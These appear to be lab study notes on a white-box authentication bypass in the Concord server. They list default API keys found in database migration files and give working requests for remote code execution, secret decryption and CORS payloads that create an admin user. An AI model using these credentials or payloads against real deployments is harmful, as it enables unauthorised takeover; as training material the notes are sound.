# Authentication Bypass: Insecure Defaults

*Note that this section is entirely white-box*

Many application deployments are used with default or automatic credentials, and as such, are often vulnerable to exploitation during code review. 

We can start by examining the initialization scripts to review how the application is booted and installed. The application runs the class defined in the `main_class` variable, which is set to either the `main` or `migrateDB` values. 

![Untitled](Authentication%20Bypass%20Insecure%20Defaults%20406759fa1a0c4fda881fb7028d72cf73/Untitled.png)

```bash
MAIN_CLASS="com.walmartlabs.concord.server.dist.Main"
if [[ "${CONCORD_COMMAND}" = "migrateDb" ]]; then
	MAIN_CLASS="com.walmartlabs.concord.server.MigrateDB"
fi

"${MAIN_CLASS}"
```

Database migrations are used to initialize the application or update applications database to current versions. We should review migrations to understand the database layout. Searching for `class migrateDB`, we are led to the file `migrateDB.java`. 

```java
import com.walmartlabs.concord.db.DatabaseModule;

public class MigrateDB {

    @Inject
    @MainDB
    private DataSource dataSource;

    public static void main(String[] args) throws Exception {
        EnvironmentSelector environmentSelector = new EnvironmentSelector();
        Config cfg = new ConfigurationProcessor("concord-server", environmentSelector.select()).process();

        Injector injector = Guice.createInjector(
                new WireModule(
                        new SpaceModule(new URLClassSpace(MigrateDB.class.getClassLoader()), BeanScanning.CACHE),
                        new OllieConfigurationModule("com.walmartlabs.concord.server", cfg),
                        new DatabaseModule()));

        new MigrateDB().run(injector);
    }

    public void run(Injector injector) throws Exception {
        injector.injectMembers(this);

        try (Connection conn = dataSource.getConnection();
             Statement st = conn.createStatement()) {
            st.execute("select 1");
        }
    }
}
```

In particular, one of the classes referenced is the `DatabaseModule` which comes from `com.walmartlabs.concord.db`. Additionally, we also find that the `resources/com/walmartlabs/concord/server/db` directory that contains XML database setup files. 

![Untitled](Authentication%20Bypass%20Insecure%20Defaults%20406759fa1a0c4fda881fb7028d72cf73/Untitled%201.png)

Among them, there is an xml file called `liqudbase.xml`, and several version files. Liquidbase is an open-source DB schema change management solution that helps manage database revisions. This likely holds information about table names, columns and data. 

```xml
<!-- USERS -->

    <changeSet id="1200" author="ibodrov@gmail.com">
        <createTable tableName="USERS" remarks="Users">
            <column name="USER_ID" type="varchar(36)" remarks="Unique user ID">
                <constraints primaryKey="true" nullable="false"/>
            </column>
            <column name="USERNAME" type="varchar(64)" remarks="Unique name of a user (login)">
                <constraints unique="true" nullable="false"/>
            </column>
        </createTable>
    </changeSet>

    <changeSet id="1210" author="ibodrov@gmail.com">
        <insert tableName="USERS">
            <column name="USER_ID">230c5c9c-d9a7-11e6-bcfd-bb681c07b26c</column>
            <column name="USERNAME">admin</column>
        </insert>
    </changeSet>
    
    <changeSet id="1440" author="ibodrov@gmail.com">
        <insert tableName="API_KEYS">
            <column name="KEY_ID">d5165ca8-e8de-11e6-9bf5-136b5db23c32</column>
            <!-- original: auBy4eDWrKWsyhiDp3AQiw -->
            <column name="API_KEY">KLI+ltQThpx6RQrOc2nDBaM/8tDyVGDw+UVYMXDrqaA</column>
            <column name="USER_ID">230c5c9c-d9a7-11e6-bcfd-bb681c07b26c</column>
        </insert>
    </changeSet>
```

This actually contains an API_KEY, and not only does it contain the encrypted key in the database, but it also contains the original, unencrypted key that we can directly use to authenticate against the server. For more information for the authentication, refer to the Extra Mile 11.2.5.2 section. 

However, when we use this key, we are unable to authenticate into the application. This could be due to later versions overriding this specific API key. As such, we can search through the XML files for any later updates: `grep -rl 'insert tableName="API_KEYS">' ./`

- Note that `-r` in `grep` refers to recursive while `l` refers to “files fulfilling the condition”

![Untitled](Authentication%20Bypass%20Insecure%20Defaults%20406759fa1a0c4fda881fb7028d72cf73/Untitled%202.png)

We can thus use the API key `c45549ac-40d6-4abf-8cd8-aca76ef55307` found in `v0.69.0.xml` to access the user interface. 

### API Keys

| Version | Original | Encrypted Key |
| --- | --- | --- |
| v0.0.1.xml | auBy4eDWrKWsyhiDp3AQiw | KLI+ltQThpx6RQrOc2nDBaM/8tDyVGDw+UVYMXDrqaA |
| v0.69.0.xml | O+JMYwBsU797EKtlRQYu+Q | 1sw9eLZ41EOK4w/iV3jFnn6cqeAMeFtxfazqVY04koY |
| v0.70.0.xml | Gz0q/DeGlH8Zs7QJMj1v8g | DrRt3j6G7b6GHY/Prddu4voyKyZa17iFkEj99ac0q/A |

## Exercises 11.3.1.1

1. *Attempt to use the first API key in Concord 1.43.0. Why does it not work in 1.83.0?*
2. *Explain how Concord hashes API keys before they are stored*

Concord performs a SHA-256 hash on the API keys, then performs a message digest hash function on the data, before finally encoding the data as base64. Refer to Extra Mile 11.2.5.2 for the source code and generation. 

1. *Review v0.70.0.xml and discover any entries*

The API key discovered authenticates the `concordRunner` user. 

1. *Obtain RCE with a curl request using the newly discovered API keys*

```bash
curl -H "Authorization: auBy4eDWrKWsyhiDp3AQiw" -F concord.yml=@concord.yml http://concord:8001/api/v1/process
```

1. *Using a Concord process, decrypt this `vyblrnt+hP8GNVOfSl9WXgGcQZceBhOmcyhQ0alyX6Rs5ozQbEvChU9K7FWSe7cf` secret value. The value was encrypted using the `Offsec` org and the `AWAE` project in Concord 1.43.0.* 

Concord provides an API to create and manage various secrets that can be used in user flows and for Git repository authentication. Secrets are created and managed using the Secret API endpoint or UI. 

Source: [Concord | Security and Permissions (walmartlabs.com)](https://concord.walmartlabs.com/docs/getting-started/security.html)

To decrypt the key in the right context, we modify our request to specify the organization ID and project name when creating our process

```python
headers = {'Authorization': api_key}

files = {
  'concord.yml': ("concord.yml", yml, 'application/yml')
}

data = {
	"orgId": "a33f418a-a474-11eb-a57c-0242ac120003",
	"project": "AWAE"
}

r = s.post(target, headers=headers, files=files, data=data)

```

In the project `AWAE`, we first allow payload archives so that we can use the `concord.yml` file to create a process. 

![Untitled](Authentication%20Bypass%20Insecure%20Defaults%20406759fa1a0c4fda881fb7028d72cf73/Untitled%203.png)

![Untitled](Authentication%20Bypass%20Insecure%20Defaults%20406759fa1a0c4fda881fb7028d72cf73/Untitled%204.png)

This gives us the message `Hello, Džemujem ja stalno ali nemam džema`

```yaml
flows:
  default:
  - log: "Hello, ${crypto.decryptString('vyblrnt+hP8GNVOfSl9WXgGcQZceBhOmcyhQ0alyX6Rs5ozQbEvChU9K7FWSe7cf')}"

```

![Untitled](Authentication%20Bypass%20Insecure%20Defaults%20406759fa1a0c4fda881fb7028d72cf73/Untitled%205.png)

## Extra Mile 11.3.1.2

*Since authorization is allowed in CORS request, we would be able to send authenticated request even if we don’t have network access to the application. Create a CORS payload using the Authorization header and discovered credentials, that should create a new admin user, generate a new API key, and obtain a shell.* 

https://concord.walmartlabs.com/docs/api/user.html

```jsx
fetch("http://concord:8001/api/v1/user", {
	headers: {
		"Authorization": "auBy4eDWrKWsyhiDp3AQiw",
		"Content-Type": "application/json"
	},
	body: JSON.stringify({
		"username": new_user_name,
		"type": "LOCAL",
		"roles": ["concordAdmin"]
	}),
	method: "POST"
})
```

https://concord.walmartlabs.com/docs/api/apikey.html

```jsx
fetch("http://concord:8001/api/v1/apikey", {
	headers: {
		"Authorization": "auBy4eDWrKWsyhiDp3AQiw",
		"Content-Type": "application/json"
	},
	body: JSON.stringify({
		"username": new_user_name
	}),
	method: "POST"
})
```

Looking through the databases, we find that the administrator role is called `concordAdmin`.  We can assign this role using the `roles` parameter. 

```sql
\dt;
select * from users;
select * from user_roles;
select * from roles;
```

![Untitled](Authentication%20Bypass%20Insecure%20Defaults%20406759fa1a0c4fda881fb7028d72cf73/Untitled%206.png)